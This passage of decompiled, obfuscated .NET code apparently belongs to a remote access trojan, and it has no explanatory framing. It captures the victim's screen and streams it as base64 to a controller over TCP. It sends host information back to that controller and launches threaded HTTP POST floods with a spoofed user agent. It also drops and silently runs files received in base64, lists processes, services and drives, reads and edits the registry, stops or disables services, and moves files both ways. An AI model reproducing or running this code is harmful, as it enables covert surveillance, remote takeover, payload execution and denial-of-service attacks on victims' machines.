									ProjectData.ClearProjectError();
								}
								P2GJS8bxDSeV172[num] = (int)memoryStream.Length;
								memoryStream.Dispose();
								memoryStream.Close();
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							num++;
						}
						while (num <= 15);
						((Image)val4).Dispose();
						((Image)val3).Dispose();
						val5.Dispose();
						GC.Collect();
						text = null;
						try
						{
							streamWriter_0.WriteLine("/STARTSET/");
							streamWriter_0.Flush();
							break;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							break;
						}
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void Nxwmr153(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			try
			{
				while (RZrtR14)
				{
					try
					{
						string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
						string text = null;
						EncoderParameters val = new EncoderParameters(1);
						val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
						ImageCodecInfo val2 = method_1("image/jpeg");
						Bitmap val3 = new Bitmap(FM1Mf53.Width, FM1Mf53.Height, (PixelFormat)135173);
						phHkNteWaHo6169 = FM1Mf53.Width;
						Jz5HFJmRryCQ170 = FM1Mf53.Height;
						new Bitmap(phHkNteWaHo6169, Jz5HFJmRryCQ170, (PixelFormat)135173);
						Size size = new Size(phHkNteWaHo6169, Jz5HFJmRryCQ170);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						val4.CopyFromScreen(FM1Mf53.X, FM1Mf53.Y, 0, 0, FM1Mf53.Size, (CopyPixelOperation)13369376);
						MemoryStream memoryStream = new MemoryStream();
						if (Conversions.ToDouble(array[0]) > 75.0)
						{
							((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						}
						else
						{
							((Image)val3).Save((Stream)memoryStream, val2, val);
						}
						checked
						{
							memoryStream.Capacity = (int)memoryStream.Length;
							if (memoryStream.Length == int_3)
							{
								try
								{
									streamWriter_0.WriteLine("/STARTSEQ/SAME");
									streamWriter_0.Flush();
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
									break;
								}
							}
							else
							{
								byte[] buffer = memoryStream.GetBuffer();
								text = Convert.ToBase64String(buffer);
								buffer = null;
								try
								{
									streamWriter_0.WriteLine("/STARTSEQ/" + text);
									streamWriter_0.Flush();
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
									break;
								}
							}
							int_3 = (int)memoryStream.Length;
							memoryStream.Dispose();
							memoryStream.Close();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					GC.Collect();
					break;
				}
				break;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Thread.Sleep(100);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void UE3mu154(object Tempdata)
	{
		int num = 0;
		do
		{
			try
			{
				if (!bool_1)
				{
					break;
				}
				Type typeFromHandle = typeof(WebRequest);
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet((object)null, typeFromHandle, "Create", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)obj;
				byte[] bytes = Encoding.UTF8.GetBytes("Hello");
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.Method = "POST";
				httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest2.ContentLength = bytes.Length;
				httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
				httpWebRequest2.Referer = "http://0mn3d6yunkn0wn.com";
				httpWebRequest2 = null;
				Stream requestStream = httpWebRequest.GetRequestStream();
				Stream stream = requestStream;
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				stream = null;
				requestStream = null;
				HttpWebResponse httpWebResponse = null;
				try
				{
					httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				}
				catch (WebException projectError)
				{
					ProjectData.SetProjectError((Exception)projectError);
					ProjectData.ClearProjectError();
				}
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				httpWebRequest = null;
				httpWebResponse = null;
				responseStream = null;
				streamReader = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num = checked(num + 1);
		}
		while (num <= 100);
	}

	private void TDRUo155(object Tempdata)
	{
		bool_1 = true;
		int num = 0;
		while (bool_1)
		{
			Thread thread = new Thread(UE3mu154);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
			num = checked(num + 1);
			if (num > 100)
			{
				break;
			}
		}
	}

	private void bkbXM156()
	{
		try
		{
			qyE5LC5ZUuyt158 = new TcpClient();
			qyE5LC5ZUuyt158.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
			cbft6vFuR99c159 = qyE5LC5ZUuyt158.GetStream();
			YSiuIPzmWZK4160 = new StreamWriter(cbft6vFuR99c159);
			CVhLK4CIOQbv49 cVhLK4CIOQbv = new CVhLK4CIOQbv49();
			string text = cVhLK4CIOQbv.M2oxGSXWy6nv225();
			string text2 = cVhLK4CIOQbv.vkA87yDeiqsp237();
			string text3 = cVhLK4CIOQbv.method_0();
			string text4 = cVhLK4CIOQbv.AN24zvdBOt5t229();
			string text5 = cVhLK4CIOQbv.FeDtF3ZJPWT3233();
			string text6 = cVhLK4CIOQbv.THSmXsprtrWd234();
			string text7 = cVhLK4CIOQbv.bqNe8U86YRY5230();
			string text8 = cVhLK4CIOQbv.method_1();
			string text9 = cVhLK4CIOQbv.O2X0Kdwl0PY6236();
			string text10 = cVhLK4CIOQbv.KpxosgwoQnyV238();
			string text11 = cVhLK4CIOQbv.zWxKiyFUkyC7217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			YSiuIPzmWZK4160.WriteLine("/TRYPAAAA/" + ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Name() + "¦" + method_2(Conversions.ToString(obj), "&%#@?,:*"));
			YSiuIPzmWZK4160.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CgWsw157(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			if (Conversions.ToDouble(array[1]) == 1.0)
			{
				Process.Start(array[0]);
				return;
			}
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(array[0]);
			byte[] bytes = Encoding.UTF8.GetBytes("Hello");
			HttpWebRequest httpWebRequest2 = httpWebRequest;
			httpWebRequest2.Method = "POST";
			httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest2.ContentLength = bytes.Length;
			httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
			httpWebRequest2 = null;
			Stream requestStream = httpWebRequest.GetRequestStream();
			Stream stream = requestStream;
			stream.Write(bytes, 0, bytes.Length);
			stream.Close();
			stream = null;
			requestStream = null;
			HttpWebResponse httpWebResponse = null;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			}
			catch (WebException projectError)
			{
				ProjectData.SetProjectError((Exception)projectError);
				ProjectData.ClearProjectError();
			}
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			streamReader.ReadToEnd();
			streamReader.Close();
			responseStream.Close();
			httpWebResponse.Close();
			httpWebRequest = null;
			httpWebResponse = null;
			responseStream = null;
			streamReader = null;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void yeIia158()
	{
		bool_1 = false;
	}

	private void yvf5F159(object temp)
	{
		try
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
			NetworkStream stream = tcpClient.GetStream();
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/TRYAVVVV/", temp), (object)"¦"), (object)CCWP0RW8104()));
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			string text2 = array.GetValue(0)!.ToString();
			if (Operators.CompareString(text2, "temp", false) == 0)
			{
				text2 = Path.GetTempPath();
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			if (!File.Exists(text2 + text))
			{
				byte[] array2 = Convert.FromBase64String(Conversions.ToString(array.GetValue(2)));
				((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().WriteAllBytes(text2 + text, array2, false);
				QSWSDxTR122(5);
			}
			string text3 = Conversions.ToString(array.GetValue(3));
			if (Operators.CompareString(text3, "0", false) == 0)
			{
				Process process = new Process();
				process.StartInfo.WorkingDirectory = text2;
				process.StartInfo.FileName = text2 + text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			else
			{
				Process process2 = new Process();
				process2.StartInfo.WorkingDirectory = text2;
				process2.StartInfo.FileName = text2 + text;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				process2.Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void mH5UB161()
	{
		try
		{
			IDzJby4gh6F1135.WriteLine("/LISTPROC/" + method_3());
			IDzJby4gh6F1135.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void X7uxv162()
	{
		try
		{
			lfZViCUhx8HU140.WriteLine("/LISTSERV/" + f7RKGso4118());
			lfZViCUhx8HU140.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void aCNpk163(object swfm)
	{
		try
		{
			string text = null;
			text = TdYkYpDa121();
			NewLateBinding.LateCall(swfm, (Type)null, "WriteLine", new object[1] { "/LISTDRVS/" + text }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swfm, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void xA3QS164(object Tempdata)
	{
		try
		{
			string text = null;
			string text2 = null;
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(Tempdata));
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(Tempdata, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
			{
				text2 = "(DIR).*(DIR)..*";
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				text = "(DIR)" + directoryInfo2.get_Name();
				text2 = text2 + text + "*";
			}
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				text = fileInfo.get_Name();
				text2 = text2 + text + "*";
			}
			Y1nh980.WriteLine("/ONLYONEP/" + text2);
			Y1nh980.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Y1nh980.WriteLine("/ERRORDIR/(DIR).*(DIR)..");
			Y1nh980.Flush();
			ProjectData.ClearProjectError();
		}
	}

	private void GVLcW165(object Node)
	{
		string text = null;
		string[] array = null;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Node, (object)"CU", false))
			{
				array = Registry.CurrentUser.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"LM", false))
			{
				array = Registry.LocalMachine.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"US", false))
			{
				array = Registry.Users.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			xYY9wY2Smq6O150.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/REGYVIEW/", Node), (object)text));
			xYY9wY2Smq6O150.Flush();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ooMfi166(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				xYY9wY2Smq6O150.WriteLine("/REGVIEWS/" + text);
				xYY9wY2Smq6O150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void jymvp167(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '¦' });
			registryKey.SetValue(array2[0], array2[1]);
			VIPK7170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Ub2Ry168(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			registryKey.DeleteValue(array[1], throwOnMissingValue: false);
			VIPK7170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void qJaNZ169(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '╫' });
			string[] array3 = array2[0].Split(new char[1] { '¦' });
			string[] array4 = array2[1].Split(new char[1] { '¦' });
			registryKey.DeleteValue(array4[0], throwOnMissingValue: false);
			registryKey.SetValue(array3[0], array3[1]);
			VIPK7170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void VIPK7170(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj));
			}
			if (array.Length <= 0)
			{
				return;
			}
			string[] array2 = array;
			foreach (object obj3 in array2)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(Conversions.ToString(obj3)));
				if (objectValue == null)
				{
					continue;
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
				string text2 = null;
				try
				{
					if ((object)objectValue2.GetType() == typeof(byte[]))
					{
						text2 = Convert.ToBase64String((byte[])objectValue2) + "bytearraystring";
					}
					else
					{
						Encoding uTF = Encoding.UTF8;
						object[] array3 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
						bool[] array4 = new bool[1] { true };
						object obj4 = NewLateBinding.LateGet((object)uTF, (Type)null, "GetBytes", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							objectValue2 = RuntimeHelpers.GetObjectValue(array3[0]);
						}
						text2 = Convert.ToBase64String((byte[])obj4);
					}
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "¥"), obj3), (object)"§"), (object)text2)) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(obj3, (object)"§"), (object)text2)));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				xYY9wY2Smq6O150.WriteLine("/REGVIEWV/" + text);
				xYY9wY2Smq6O150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void vNVWK171(object Tempdata)
	{
		try
		{
			Thread thread = new Thread(gEMEL195);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void qWSXd172(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			switch (array[1])
			{
			case "STOP":
			{
				IO9palTiPhUt48 iO9palTiPhUt5 = new IO9palTiPhUt48(array[0]);
				((ServiceController)iO9palTiPhUt5).Stop();
				break;
			}
			case "START":
			{
				IO9palTiPhUt48 iO9palTiPhUt4 = new IO9palTiPhUt48(array[0]);
				((ServiceController)iO9palTiPhUt4).Start();
				break;
			}
			case "DISABLE":
			{
				IO9palTiPhUt48 iO9palTiPhUt3 = new IO9palTiPhUt48(array[0]);
				iO9palTiPhUt3.StartupType = "Disabled";
				break;
			}
			case "MANUAL":
			{
				IO9palTiPhUt48 iO9palTiPhUt2 = new IO9palTiPhUt48(array[0]);
				iO9palTiPhUt2.StartupType = "Manual";
				break;
			}
			case "AUTO":
			{
				IO9palTiPhUt48 iO9palTiPhUt = new IO9palTiPhUt48(array[0]);
				iO9palTiPhUt.StartupType = "Auto";
				break;
			}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void zlffb173()
	{
		checked
		{
			try
			{
				if (short_0 != FYlMw43)
				{
					StringBuilder stringBuilder = new StringBuilder();
					StringBuilder stringBuilder2 = new StringBuilder();
					short_0++;
					JTRDy38 = new byte[tPH6935 - 1 + 1];
					OGuUb42.Read(JTRDy38, 0, tPH6935);
					DXYgT45 = OGuUb42.BaseStream.Seek(0L, SeekOrigin.Current);
					stringBuilder.Append("/PAKSSEND/");
					int num = JTRDy38.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						stringBuilder2.Append(JTRDy38.GetValue(i)!.ToString() + " ");
					}
					stringBuilder.Append((object?)stringBuilder2);
					Y1nh980.WriteLine((object?)stringBuilder);
					Y1nh980.Flush();
				}
				else if (EAmFK44 > 0L)
				{
					StringBuilder stringBuilder3 = new StringBuilder();
					StringBuilder stringBuilder4 = new StringBuilder();
					JTRDy38 = new byte[(int)(EAmFK44 - 1L) + 1];
					OGuUb42.Read(JTRDy38, 0, (int)EAmFK44);
					stringBuilder3.Append("/FINEDOWN/");
					int num2 = JTRDy38.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						stringBuilder4.Append(JTRDy38.GetValue(j)!.ToString() + " ");
					}
					stringBuilder3.Append((object?)stringBuilder4);
					Y1nh980.WriteLine((object?)stringBuilder3);
					Y1nh980.Flush();
					Nxp1V0sL114();
				}
				else
				{
					Y1nh980.WriteLine("/FINEDOWN/");
					Y1nh980.Flush();
					Nxp1V0sL114();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					Nxp1V0sL114();
					Y1nh980.WriteLine("/ERROR/");
					Y1nh980.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Bgh0p174(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
				string text = array.GetValue(1)!.ToString();
				string text2 = array.GetValue(0)!.ToString();
				if (!Directory.Exists(text2))
				{
					Directory.CreateDirectory(text2);
				}
				string[] array2 = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(array.GetValue(2), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array3 = new byte[array2.GetUpperBound(0) + 1];
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array3[i] = Conversions.ToByte(array2.GetValue(i));
				}
				if (array2.Length < 32768)
				{
					m9Tt746 = text2 + text;
					if (File.Exists(m9Tt746))
					{
						QSWSDxTR122(1);
						try
						{
							File.Delete(m9Tt746);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							try
							{
								QSWSDxTR122(1);
								fileStream_1.Flush();
								fileStream_1.Close();
								binaryWriter_0.Close();
								File.Delete(m9Tt746);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								try
								{
									QSWSDxTR122(1);
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									File.Delete(m9Tt746);
									ProjectData.ClearProjectError();
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					fileStream_1 = new FileStream(m9Tt746, FileMode.CreateNew);
					binaryWriter_0 = new BinaryWriter(fileStream_1);
					JTRDy38 = new byte[array2.Length - 1 + 1];
					JTRDy38 = array3;
					binaryWriter_0.Write(JTRDy38);
					fileStream_1.Flush();
					fileStream_1.Close();
					binaryWriter_0.Close();
					return;
				}
				m9Tt746 = text2 + text;
				if (File.Exists(m9Tt746))
				{
					QSWSDxTR122(1);
					try
					{
						File.Delete(m9Tt746);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						try
						{
							QSWSDxTR122(1);
							fileStream_1.Flush();
							fileStream_1.Close();
							binaryWriter_0.Close();
							File.Delete(m9Tt746);
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							try
							{
								QSWSDxTR122(1);
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								File.Delete(m9Tt746);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
				}
				fileStream_1 = new FileStream(m9Tt746, FileMode.CreateNew);
				binaryWriter_0 = new BinaryWriter(fileStream_1);
				JTRDy38 = new byte[array2.Length - 1 + 1];
				JTRDy38 = array3;
				binaryWriter_0.Write(JTRDy38);
				fileStream_1.Flush();
				Y1nh980.WriteLine("/ANOTHEPK/");
				Y1nh980.Flush();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				try
				{
					fileStream_1.Flush();
					fileStream_1.Close();
					binaryWriter_0.Close();
					Y1nh980.WriteLine("/ERRORUPL/");
					Y1nh980.Flush();
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void lybis175(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array2 = new byte[array.GetUpperBound(0) + 1];
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = Conversions.ToByte(array.GetValue(i));
				}
				JTRDy38 = new byte[array.Length - 1 + 1];
				JTRDy38 = array2;
				binaryWriter_0.Write(JTRDy38);
				fileStream_1.Flush();
				Y1nh980.WriteLine("/ANOTHEPK/");
				Y1nh980.Flush();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					fileStream_1.Flush();
					fileStream_1.Close();
					binaryWriter_0.Close();
					Y1nh980.WriteLine("/ERRORUPL/");
					Y1nh980.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void XLXc1176(object Tempdata)
	{
		checked
		{
			try
			{
				if (Operators.ConditionalCompareObjectNotEqual(Tempdata, (object)"", false))
				{
